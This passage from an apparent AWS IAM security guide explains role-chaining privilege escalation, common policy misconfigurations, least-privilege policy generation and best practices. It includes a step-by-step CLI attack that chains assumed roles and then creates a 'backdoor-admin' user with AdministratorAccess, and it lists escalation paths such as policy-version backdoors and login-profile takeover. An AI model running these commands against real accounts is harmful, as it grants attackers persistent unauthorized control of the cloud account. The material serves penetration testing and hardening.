Role chaining is a privilege escalation technique where an attacker uses one role to assume another role with higher privileges. The `assume_role_chain()` function demonstrates chaining through multiple roles sequentially, using each set of credentials to assume the next role.

The `enumerate_assumable_roles()` function discovers which roles the current identity can assume by examining each role's trust policy document for principal entries matching the current ARN or wildcard principals.

### AWS CLI Role Chain Attack (Step-by-Step)

```bash
# Step 1: Check current identity (low privilege)
aws sts get-caller-identity

# Step 2: Assume first role
aws sts assume-role \
    --role-arn "arn:aws:iam::123456789012:role/dev-cross-account-role" \
    --role-session-name "pentest-session-1"

# Set temporary credentials
export AWS_ACCESS_KEY_ID="ASIA..."
export AWS_SECRET_ACCESS_KEY="..."
export AWS_SESSION_TOKEN="..."

# Step 3: Assume second (higher privilege) role
aws sts assume-role \
    --role-arn "arn:aws:iam::123456789012:role/staging-admin-role" \
    --role-session-name "pentest-session-2"

# Step 4: Create backdoor admin account with final privileges
aws iam create-user --user-name backdoor-admin
aws iam attach-user-policy \
    --user-name backdoor-admin \
    --policy-arn "arn:aws:iam::aws:policy/AdministratorAccess"
```

---

## 6. Common Misconfigured IAM Policies

| Bad Pattern | Risk | Better Alternative |
|-------------|------|--------------------|
| `"Action": "s3:*"` | Full S3 access | Specific s3:GetObject, s3:PutObject |
| `AdministratorAccess` managed policy | Full account access | Custom least-privilege policy |
| `"Resource": "*"` everywhere | Affects all resources | Specific ARNs per resource |
| `"iam:*"` permission | Create/delete any IAM entity | Remove entirely or scope tightly |
| No conditions on AssumeRole | Any principal can assume | Add ExternalId, MFA condition |

---

## 7. Automated Least Privilege Policy Generation

The policy generator parses Lambda function Python source code using the `ast` module to identify `boto3.client()` and `boto3.resource()` calls, then maps the detected service names and method calls to the minimum required IAM actions.

**Example output:**
```json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Action": [
      "dynamodb:GetItem",
      "dynamodb:PutItem",
      "logs:CreateLogGroup",
      "logs:CreateLogStream",
      "logs:PutLogEvents",
      "s3:GetObject",
      "secretsmanager:GetSecretValue"
    ],
    "Resource": "*"
  }]
}
```

**Usage:**
```bash
python3 policy_generator.py ./lambda_src/ -o minimum_policy.json
```

---

## 8. IAM Security Best Practices

| Principle | Implementation |
|-----------|---------------|
| Least Privilege | Dedicated role per function — no shared roles |
| Specific Resource ARNs | Use `arn:aws:s3:::my-bucket/*` format |
| Condition Keys | Add `aws:SourceAccount`, `aws:SourceArn` conditions |
| Permission Boundaries | Cap maximum permissions with Permission Boundary |
| Role Session Tagging | Attach session tags for audit trail |
| Temporary Credentials | Use STS temporary tokens instead of long-term credentials |
| SCP | Use AWS Organization SCPs as account-level guardrails |
| Access Analyzer | Use IAM Access Analyzer to detect external access |

---

## 9. boto3 IAM Enumeration Script Summary

The full IAM enumeration script (`enumerate_iam_full`) performs:
1. Identity discovery via `sts:GetCallerIdentity`
2. Role enumeration with trust policy analysis
3. Effective permission collection (inline + managed policies)
4. Privilege escalation path detection against 5+ known paths
5. JSON report output for further analysis

Key privilege escalation paths detected:
- PassRole + Lambda/EC2 service abuse
- CreatePolicyVersion (backdoor via new policy version)
- AssumeRole + AttachRolePolicy chain
- CreateLoginProfile (account takeover)
- SetDefaultPolicyVersion (enable dormant high-privilege version)
